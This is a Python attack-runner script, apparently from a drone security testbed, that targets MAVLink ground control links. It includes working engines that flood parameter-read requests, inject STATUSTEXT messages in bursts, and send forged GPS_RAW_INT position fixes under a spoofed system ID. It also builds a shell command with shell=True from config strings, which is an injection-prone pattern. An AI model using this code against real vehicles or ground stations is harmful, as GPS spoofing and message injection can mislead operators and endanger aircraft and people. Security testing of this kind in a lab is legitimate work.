#!/usr/bin/env python3
import os, sys, json, time
from pathlib import Path

BASE = Path(__file__).resolve().parents[2]
OUT_DIR = Path(os.environ.get("OUT_DIR", str(BASE / "bus")))
BUS_LOG = Path(os.environ.get("BUS_LOG", str(OUT_DIR / "bus.log")))
PROFILE = BASE / "modules" / "attacks" / "lpc_profiles" / "attacks_lpc.json"

from pymavlink import mavutil

def log_bus(msg: str):
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    with BUS_LOG.open("a", encoding="utf-8") as f:
        f.write(f'[{int(time.time())}] BUS ATK {msg}\n')

def load_json(path: Path):
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)

def resolve_target(role: str, service: str):
    import subprocess, json
    cmd = f"python3 {BASE}/modules/attacks/resolve_target.py {BASE}/modules/attacks/targets/targets.yml {role} {service}"
    out = subprocess.check_output(cmd, shell=True, text=True).strip()
    return json.loads(out)

def connect_mav_udpout(host: str, port: int):
    # 전송 전용 링크 (GCS는 udp 수신 오픈 상태)
    link = f"udpout:{host}:{port}"
    m = mavutil.mavlink_connection(link, source_system=255, source_component=1)
    # 대상 기본값(없으면 1,1로 가정)
    m.target_system = getattr(m, "target_system", 1) or 1
    m.target_component = getattr(m, "target_component", 1) or 1
    return m

# ---------- Engines ----------
def engine_mavlink_param_poll(cfg, env):
    role = cfg["params"].get("target_role","gcs")
    svc  = cfg["params"].get("service","mavlink")
    t    = resolve_target(role, svc)
    m = connect_mav_udpout(t["ip"], int(t["port"]))

    names = cfg["level"]["names"]
    count = int(cfg["level"]["count"])
    interval = float(cfg["level"]["interval_s"])

    for i in range(count):
        for name in names:
            nm = name if name != "*" else "SYSID_THISMAV"
            m.mav.param_request_read_send(m.target_system, m.target_component, nm.encode(), -1)
            time.sleep(interval)

def mav_send_statustext(m, txt: str, pps:int, burst_ms:int, sleep_ms:int):
    end = time.time() + (burst_ms/1000.0)
    while time.time() < end:
        m.mav.statustext_send(5, txt.encode()[:50])
        time.sleep(max(0.0, 1.0/pps))
    time.sleep(sleep_ms/1000.0)

def engine_mavlink_inject(cfg, env):
    role = cfg["params"].get("target_role","gcs")
    svc  = cfg["params"].get("service","mavlink")
    t    = resolve_target(role, svc)
    m = connect_mav_udpout(t["ip"], int(t["port"]))

    msg = cfg.get("message","STATUSTEXT")
    lv  = cfg["level"]
    if msg == "STATUSTEXT":
        mav_send_statustext(m, lv.get("text","dbg"),
                            int(lv.get("pps",2)), int(lv.get("burst_ms",800)), int(lv.get("sleep_ms",1200)))
    elif msg in ("GPS_INPUT", "GPS_RAW_INT"):
        # RAW_INT 로 안전 송신(정수 필드)
        lat0, lon0, altm = 37.2418592, -115.796917, 137.0
        try:
            # 최신 mav_snapshot에서 위치 추정
            snap = None
            with open(OUT_DIR / "bus_dvd.log","r",encoding="utf-8") as f:
                for line in f.readlines()[::-1]:
                    if '"evt": "mav_snapshot"' in line or '"evt":"mav_snapshot"' in line:
                        snap = json.loads(line); break
            if snap:
                p = snap.get("pos",{})
                lat0, lon0, altm = float(p.get("lat",lat0)), float(p.get("lon",lon0)), float(p.get("alt",altm))
        except Exception:
            pass

        delta_m = float(lv.get("delta_m", 3.0))
        ddeg = delta_m / 111111.0
        lat = int((lat0 + ddeg) * 1e7)
        lon = int((lon0 + ddeg) * 1e7)
        alt_mm = int(altm * 1000)

        tnow = int(time.time()*1e6)
        fix_type = 3
        eph = 150; epv = 150; vel = 0; cog = 0; sats = 9
        try:
            m.mav.gps_raw_int_send(tnow, fix_type, lat, lon, alt_mm, eph, epv, vel, cog, sats)
        except Exception as e:
            log_bus(f"GPS_RAW_INT_FALLBACK err={e}")
    else:
        raise RuntimeError(f"Unsupported message: {msg}")

ENGINES = {
    "mavlink_param_poll": engine_mavlink_param_poll,
    "mavlink_inject":     engine_mavlink_inject,
}

def main():
    if len(sys.argv) < 2:
        print("usage: lpc_runner.py <attack_key> [level]"); sys.exit(2)
    attack_key = sys.argv[1]
    level = sys.argv[2] if len(sys.argv) > 2 else "low"

    prof = load_json(PROFILE)
    atk = prof["attacks"].get(attack_key)
    if not atk:
        log_bus(f"PROFILE_MISSING key={attack_key} path={PROFILE}")
        sys.exit(2)

    lv = (atk.get("levels") or {}).get(level)
    if not lv:
        log_bus(f"LEVEL_MISSING key={attack_key} level={level}")
        sys.exit(2)

    params = {"target_role": "gcs", "service":"mavlink"}
    params.update(atk.get("params",{}))
    cfg = {"engine": atk.get("engine",""), "message": atk.get("message",""), "params": params, "level": lv}

    log_bus(f"ATTACK_START key={attack_key} level={level} role={params['target_role']}")
    ENGINES[cfg["engine"]](cfg, os.environ)
    log_bus(f"ATTACK_END key={attack_key} level={level} role={params['target_role']}")

if __name__ == "__main__":
    main()
